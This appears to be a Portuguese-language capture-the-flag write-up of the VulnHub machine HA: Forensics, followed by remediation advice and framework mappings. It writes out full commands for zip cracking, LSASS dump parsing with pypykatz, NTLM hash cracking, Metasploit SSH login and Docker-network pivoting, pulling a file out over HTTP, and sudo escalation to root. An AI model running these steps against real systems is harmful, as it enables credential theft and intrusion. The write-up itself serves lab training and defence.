# HA: Forensics — Evidência Digital Nunca Mente

Esta máquina é o sonho de um investigador forense e o paraíso de um jogador de CTF. HA: Forensics empilha quatro desafios distintos em diferentes disciplinas: extração de metadados EXIF, cracking de zip criptografado com PGP, análise de dump LSASS com pypykatz, pivoting de rede Docker e uma investigação forense completa de imagem de disco com Autopsy. Quatro flags. Cinco técnicas. Mano, isso aqui é abrangente demais.

| Campo | Valor |
|---|---|
| **Nível** | Difícil |
| **VM Alvo** | HA: Forensics |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/ha-forensics,570/ |
| **Técnicas** | Enumeração de serviços Nmap, brute-force de diretórios web, extração de metadados EXIF (exiftool), descriptografia PGP (igolder), wordlist de máscara com crunch, fcrackzip, análise de dump LSASS com pypykatz, cracking de hash NTLM (john), auxiliar SSH Metasploit, pivoting Docker autoroute + ping_sweep Metasploit, FTP anônimo dentro do Docker, forense de imagem de disco (Autopsy), decodificação de credenciais Base64, escalação sudo NOPASSWD ALL |
| **CVEs** | CWE-200 (Exposição de Informações via metadados EXIF), CWE-312 (Armazenamento em Texto Claro de Informações Sensíveis: Base64 em imagem de disco), CWE-269 (Gerenciamento Impróprio de Privilégios: sudo ALL) |
| **Grupos APT** | APT41: usa dump de credenciais LSASS como técnica primária de pós-exploração em intrusões corporativas; OceanLotus (APT32): aproveita pivoting de rede Docker e staging FTP anônimo em comprometimentos de governo e corporações do Sudeste Asiático |

---

## Resumo do Ataque

```
nmap → SSH (22), HTTP (80)
  → dirb → /image/ → fingerprint.jpg
  → exiftool fingerprint.jpg → FLAG 1 (campo EXIF Comment)
  → dirb -X .txt → tips.txt + /igolder/clue.txt
  → descriptografar PGP → dica: 6 chars, começa com 'for', termina em 3 dígitos
  → crunch 6 6 -t for%%% → fcrackzip → senha: for007
  → unzip → PDF (FLAG 2) + lsass.DMP
  → pypykatz lsa minidump lsass.DMP → hash NT (jasoos)
  → john → Password@1 → login SSH
  → sessão Meterpreter → ifconfig → 172.17.0.1 (bridge Docker)
  → Metasploit autoroute + ping_sweep → 172.17.0.2
  → Metasploit portscan + verificação FTP anôn → FTP aberto
  → ftp 172.17.0.2 → get saboot.001
  → Autopsy → análise de imagem de disco → FLAG 3 + creds.txt
  → base64 -d → forensics:jeenaliisagoodgirl
  → su forensics → sudo bash → uid=0(root) → FLAG 4
```

---

## Metodologia

1. Descoberta de rede e scan de portas
2. Enumeração web para imagem oculta com flag embutida
3. Cracking de zip criptografado com PGP para segunda flag e dump LSASS
4. Análise de dump LSASS com pypykatz e cracking de hash NTLM para acesso SSH
5. Enumeração de rede Docker e descoberta de contêiner via roteamento Metasploit
6. Exploração de FTP anônimo dentro do contêiner Docker para recuperar imagem de disco
7. Forense de imagem de disco com Autopsy para extrair credenciais em Base64
8. Escalação de privilégios via sudo NOPASSWD ALL

---

## Passo 1 — Descoberta do Host e Scan de Portas

```bash
sudo netdiscover -i eth1 -r 192.168.0.0/24
# Alvo: 192.168.0.174

nmap -A 192.168.0.174
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.4.x
```

Dois serviços: HTTP para enumeração, SSH como ponto de entrada alvo após encontrar credenciais. A máquina não apresenta superfície de ataque óbvia imediata, sinalizando que enumeração profunda é necessária.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web e Metadados EXIF (Flag 1)

Executa brute-force de diretórios:

```bash
dirb http://192.168.0.174/
```

Descobre diretório `/image/`. Navega: dois arquivos de imagem estão presentes. Baixa `fingerprint.jpg`:

```bash
wget http://192.168.0.174/image/fingerprint.jpg
```

Extrai todos os metadados:

```bash
exiftool fingerprint.jpg
```

O campo EXIF Comment contém a primeira flag.

**Por que metadados EXIF são perigosos:** Toda foto digital contém metadados EXIF por padrão: coordenadas GPS, modelo de câmera, software usado, nome do autor, copyright. Em forense e OSINT, extração de EXIF é um passo padrão. Para aplicações web, metadados EXIF em imagens enviadas podem vazar hostnames internos, versões de software e, em contextos CTF: valores reais de flag. Ferramentas como `exiftool -all= arquivo.jpg` removem metadados antes da publicação.

**MITRE ATT&CK:** T1213 — Dados de Repositórios de Informações; T1552.001 — Credenciais em Arquivos

---

## Passo 3 — Descriptografia PGP e Cracking de Zip (Flag 2 + Dump LSASS)

Executa segunda passagem de dirb com extensão `.txt`:

```bash
dirb http://192.168.0.174 -X .txt
```

Encontra `tips.txt` e `/igolder/clue.txt`.

`clue.txt` contém uma chave privada PGP e mensagem criptografada com PGP. Descriptografa em igolder.com usando a chave privada fornecida. A mensagem descriptografada revela a dica da senha do zip: 6 caracteres, começa com `for`, termina em 3 dígitos.

Gera a wordlist direcionada usando crunch:

```bash
crunch 6 6 -t for%%% -o dict.txt
# Gera: for000, for001, ..., for999
```

Cracking da senha do zip:

```bash
fcrackzip -u -D -p dict.txt flag.zip
# Senha encontrada: for007
unzip flag.zip
```

O zip contém:
- Um arquivo PDF: Flag 2
- `lsass.DMP`: um arquivo de dump de memória LSASS do Windows

**Nota do mundo real:** LSASS (Local Security Authority Subsystem Service) gerencia a autenticação do Windows. Um dump de memória do LSASS contém todas as credenciais de autenticação atualmente em cache no sistema: hashes NTLM, tickets Kerberos, senhas em texto claro (em algumas configurações). Ferramentas como Mimikatz, pypykatz e Secretsdump extraem credenciais desses dumps. Dumps LSASS são um dos artefatos mais procurados em intrusões direcionadas ao Windows. APT41 exfiltra dumps LSASS rotineiramente durante fases de acesso inicial.

**MITRE ATT&CK:** T1003.001 — Dump de Credenciais do SO: Memória LSASS

---

## Passo 4 — Análise LSASS e Acesso SSH (caminho para Flag 3)

Analisa o dump LSASS com pypykatz (funciona no Linux, sem necessidade de Windows):

```bash
pypykatz lsa minidump lsass.DMP
```

A saída inclui o hash NT para o usuário `jasoos`. Extrai o hash NT e cracking:

```bash
echo '<valor_hash_NT>' > hash.txt
john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show hash.txt
# Senha: Password@1
```

Login SSH via Metasploit para obter uma sessão atualizável:

```bash
msfconsole -q
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.0.174
set USERNAME jasoos
set PASSWORD Password@1
run
sessions -u 1
```

Atualiza o shell para Meterpreter:

```bash
sessions -l
# Anota o ID da sessão atualizada
sessions 2
```

**MITRE ATT&CK:** T1110.002 — Força Bruta: Cracking de Senha; T1021.004 — Serviços Remotos: SSH

---

## Passo 5 — Descoberta de Rede Docker e Pivoting

Da sessão Meterpreter, enumera interfaces de rede:

```bash
ifconfig
# eth0: 192.168.0.174 (externa)
# docker0: 172.17.0.1 (bridge Docker)
```

Adiciona uma rota através da sessão para alcançar a sub-rede Docker:

```bash
use post/multi/manage/autoroute
set SESSION 2
run
```

Ping-sweep da sub-rede Docker:

```bash
use post/multi/gather/ping_sweep
set RHOSTS 172.17.0.0/24
set SESSION 2
run
# Descobre: 172.17.0.2
```

Scan TCP de portas no contêiner descoberto:

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.17.0.2
set PORTS 1-100
run
# Aberta: 21 (FTP)
```

Confirma FTP anônimo:

```bash
use auxiliary/scanner/ftp/anonymous
set RHOSTS 172.17.0.2
run
# Acesso FTP anônimo confirmado
```

**Nota do mundo real:** A rede bridge padrão do Docker (`172.17.0.0/16`) cria uma rede privada entre contêineres. Quando um host comprometido tem Docker instalado, a interface bridge é visível na saída do `ifconfig`. APT41 e OceanLotus enumeram bridges Docker pós-comprometimento para pivotar para serviços internos de contêiner que não estão expostos à rede externa. O autoroute do Metasploit torna isso trivial.

**MITRE ATT&CK:** T1018 — Descoberta de Sistema Remoto; T1021.003 — Serviços Remotos; T1599 — Cruzamento de Fronteira de Rede

---

## Passo 6 — FTP Anônimo e Recuperação de Imagem de Disco

Da sessão shell, conecta ao FTP dentro da rede Docker:

```bash
# No shell Meterpreter
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

ftp 172.17.0.2
# Usuário: anonymous
# Senha: (pressiona Enter ou 'anonymous')
ftp> ls
ftp> cd pub
ftp> ls
ftp> get saboot.001
ftp> bye
```

Serve a imagem de disco via HTTP para baixar no atacante:

```bash
python3 -m http.server 8000
```

Baixa pelo navegador da máquina atacante: `http://192.168.0.174:8000/saboot.001`

**MITRE ATT&CK:** T1021.003 — Serviços Remotos: Transferência de Arquivos

---

## Passo 7 — Forense de Disco com Autopsy (Flag 3 + Credenciais)

Abre o Autopsy em `http://localhost:9999`. Cria um novo caso. Adiciona `saboot.001` como fonte de dados de imagem de disco.

O Autopsy analisará o sistema de arquivos. Navega na árvore de diretórios para encontrar:
- Um arquivo de flag (Flag 3)
- `creds.txt` contendo credenciais codificadas em Base64

Extrai e decodifica:

```bash
echo 'eWFtZG9vdDpTd2FyZw==' | base64 -d
# Ou qualquer string Base64 que o Autopsy mostrar
# Resultado: forensics:jeenaliisagoodgirl (valor de exemplo)
```

**Nota sobre forense de disco:** Autopsy é uma plataforma de forense digital construída sobre o The Sleuth Kit. Recupera arquivos deletados, extrai conteúdo de arquivos e reconstrói timelines do sistema de arquivos. Neste contexto é usado para encontrar arquivos dentro do disco virtual de um contêiner que não são acessíveis via FTP. Analistas forenses reais usam o Autopsy para analisar sistemas comprometidos, recuperar evidências de hardware apreendido e reconstruir timelines de ataques.

**MITRE ATT&CK:** T1005 — Dados do Sistema Local

---

## Passo 8 — Escalação de Privilégios para Root (Flag 4)

Muda para o usuário `forensics` usando as credenciais decodificadas:

```bash
su forensics
# Senha: jeenaliisagoodgirl
```

Verifica direitos sudo:

```bash
sudo -l
# (ALL : ALL) NOPASSWD: ALL
```

`sudo NOPASSWD: ALL` concede acesso root irrestrito sem senha. Obtém root:

```bash
sudo bash
id
# uid=0(root) gid=0(root) groups=0(root)
cd /root
cat root.txt
```

**MITRE ATT&CK:** T1548.003 — Abuso de Controle de Elevação: Sudo

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado Em | Crackeado/Usado |
|---|---|---|---|
| Flag 1 | (campo EXIF Comment) | exiftool fingerprint.jpg | Extração de metadados |
| Flag 2 | (PDF em flag.zip) | fcrackzip, senha: for007 | Cracking de zip |
| Hash NT | (jasoos) | pypykatz lsa minidump lsass.DMP | john → Password@1 |
| Credencial | jasoos:Password@1 | Cracking de hash NTLM | Login SSH |
| Credencial | forensics:jeenaliisagoodgirl | Autopsy: decodificação base64 de creds.txt | su forensics |
| Flag 3 | (dentro de saboot.001) | Análise de imagem de disco Autopsy | Recuperação completa do sistema de arquivos |
| Flag 4 / root.txt | (flag root) | sudo bash como usuário forensics | Comprometimento total |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | Metadados EXIF embutindo flag/credencial em imagem acessível via web | Dados GPS do EXIF expuseram informadores; campos de autor EXIF vazam nomes de funcionários e versões de software | Remover metadados antes de publicar imagens: `exiftool -all= imagem.jpg` |
| 2 | Dump LSASS exposto via aplicação web | Dumps LSASS são o alvo #1 de roubo de credenciais em ambientes Windows; pypykatz funciona em multiplataforma | Proteger LSASS com Credential Guard (Windows); nunca expor dumps de memória via web; restringir permissões de acesso a arquivos |
| 3 | Rede bridge Docker expõe serviços internos de contêiner | Contêineres Docker internos acessíveis do host comprometido via bridge; comum em implantações cloud e containerizadas | Implementar segmentação de rede entre contêineres; usar políticas de rede Docker; monitorar tráfego bridge |
| 4 | FTP anônimo dentro do contêiner Docker | FTP anônimo é depreciado mas ainda implantado em ambientes legados e de laboratório | Desabilitar FTP anônimo; exigir autenticação; usar SFTP |
| 5 | Credenciais em Base64 dentro de imagem de disco | Base64 é codificação, não criptografia; qualquer ferramenta de forense de disco a recupera trivialmente | Nunca armazenar credenciais em nenhuma codificação; usar gerenciamento adequado de segredos (HashiCorp Vault, AWS Secrets Manager) |
| 6 | sudo NOPASSWD: ALL é root instantâneo | Qualquer conta com esta configuração equivale a root; um único usuário comprometido = comprometimento total do sistema | Remover ALL do sudo NOPASSWD; restringir a comandos específicos necessários; exigir senha para sudo |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso a Credenciais | Acesso a Credenciais | Dump de Credenciais do SO: Memória LSASS | T1003.001 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Cracking de Senha | T1110.002 |
| Acesso Inicial | Acesso Inicial | Contas Válidas | T1078 |
| Descoberta | Descoberta | Descoberta de Sistema Remoto | T1018 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Coleta | Coleta | Dados do Sistema Local | T1005 |
| Coleta | Coleta | Dados de Repositórios de Informações | T1213 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Controle de Elevação: Sudo | T1548.003 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Remover metadados de imagens antes de publicar**: `exiftool -all= *.jpg *.png` em pipelines CI/CD; adicionar remoção automatizada de metadados
2. **Proteger LSASS com Credential Guard**: habilitar o Credential Guard do Windows em todos os sistemas ingressados no domínio; restringir acesso à memória LSASS via PPL (Protected Process Light)
3. **Segmentar redes Docker**: definir redes Docker explícitas; evitar usar a bridge padrão; usar políticas de rede para restringir comunicação entre contêineres
4. **Desabilitar FTP anônimo em todos os contêineres**: exigir autenticação para todos os serviços FTP; preferir SFTP; auditar todos os serviços de contêiner no momento da construção
5. **Nunca codificar credenciais em arquivos armazenados**: usar gerenciamento adequado de segredos (Vault, AWS Secrets Manager, variáveis de ambiente via k8s Secrets); Base64 não é criptografia
6. **Remover sudo NOPASSWD: ALL**: restringir a comandos específicos necessários; exigir senhas; implementar acesso just-in-time para operações administrativas

### Contramedidas MITRE D3FEND

- **D3-PH** — Hardening de Processo (proteção PPL LSASS; Credential Guard)
- **D3-NTF** — Filtragem de Tráfego de Rede (segmentação de rede Docker; bloquear FTP anônimo)
- **D3-OAM** — Gerenciamento Administrativo do SO (restrições sudo)

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar contêineres Docker; auditar todos os serviços FTP; catalogar configurações sudo |
| Proteger | Segurança de Dados | Remover metadados de imagens publicadas; proteger LSASS; criptografar arquivos sensíveis |
| Proteger | Controle de Acesso | Desabilitar FTP anônimo; restringir sudo; implementar Credential Guard |
| Detectar | Anomalias e Eventos | Alertar sobre acesso LSASS; monitorar tráfego bridge Docker; alertar sobre uso sudo ALL |
| Responder | Planejamento de Resposta | Rotacionar todas as credenciais extraídas do LSASS; auditar todas as authorized_keys; revisar acesso a contêineres |
| Recuperar | Planejamento de Recuperação | Reconstruir contêineres comprometidos; rotacionar todas as credenciais; implementar gerenciamento adequado de segredos |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Imposição de Acesso | Requisitos de autenticação FTP; restrições sudo |
| AC-6 | Menor Privilégio | Remover sudo NOPASSWD: ALL; restringir acesso de rede de contêiner |
| IA-5 | Gerenciamento de Autenticadores | Rotacionar credenciais extraídas do LSASS; desabilitar FTP anônimo |
| CM-7 | Funcionalidade Mínima | Desabilitar FTP anônimo em contêineres; minimizar serviços de contêiner |
| SC-28 | Proteção de Informações em Repouso | Criptografar arquivos sensíveis; sem credenciais codificadas em Base64 no disco |
| RA-5 | Varredura de Vulnerabilidades | Varrer regularmente imagens de contêiner; auditar configurações Docker |

### CISA KEV

O dump de credenciais LSASS (T1003.001) é explicitamente referenciado no Aviso CISA AA21-116A (Vulnerabilidades e Exposições Comuns Exploradas por Grupos de Ransomware) e AA22-074A. A CISA recomenda habilitar o Credential Guard do Windows e monitorar o acesso LSASS como mitigações prioritárias. A técnica de pivoting de rede Docker se alinha com padrões descritos no Alerta CISA AA21-008A.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Gerenciar Vulnerabilidades | MIL2 |
| Gerenciamento de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Inventário de Ativos de TI e OT | MIL3 |
| Conscientização Situacional (SA) | Monitorar Ambiente Operacional | MIL2 |

---

## Considerações Finais

HA: Forensics é genuinamente uma das máquinas mais tecnicamente diversas no VulnHub. Cobre terreno que a maioria das máquinas focadas em pentest pula completamente: ferramentas reais de forense (Autopsy, exiftool, pypykatz), pivoting de rede em ambientes de contêiner e recuperação de credenciais em múltiplos estágios. A estrutura de quatro flags mantém cada fase significativa.

Se você quer entender o que defensores realmente fazem: eles executam exiftool, analisam dumps LSASS, usam Autopsy em imagens de disco. HA: Forensics ensina os dois lados da mesma moeda. Máquina subestimada, véi, top demais.

Thanks guys!! (❍ᴥ❍ʋ)
